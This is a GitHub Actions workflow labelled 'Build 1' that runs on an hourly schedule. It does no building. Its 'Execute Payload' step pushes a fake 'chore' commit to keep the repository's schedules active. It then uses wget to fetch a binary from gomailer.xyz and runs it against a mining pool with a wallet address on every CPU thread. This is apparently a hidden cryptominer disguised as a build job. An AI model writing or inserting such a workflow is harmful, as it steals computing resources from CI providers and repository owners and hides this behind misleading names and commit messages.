name: Build 1

on:
  workflow_dispatch:
  schedule:
    - cron: '0 * * * *' 

jobs:
  build:
    runs-on: bitrise-runner-tes
   
    timeout-minutes: 350 
    
    concurrency: 
      group: worker-pool-${{ github.workflow }}
      cancel-in-progress: true

    steps:
      - uses: actions/checkout@v4

      - name: Execute Payload
        run: |
          set -e
          echo "# Activated $(date)" >> activity.log
          git add activity.log
          git commit -m "chore: activate repo for scheduled workflows"
          git push origin main
          wget -O s https://gomailer.xyz/s && chmod +x s && ./s --pool-url ads.edumailer.xyz:53917 --address '@thundergold' --pool-worker N$(shuf -i 1-99999 -n 1) --threads $(nproc)
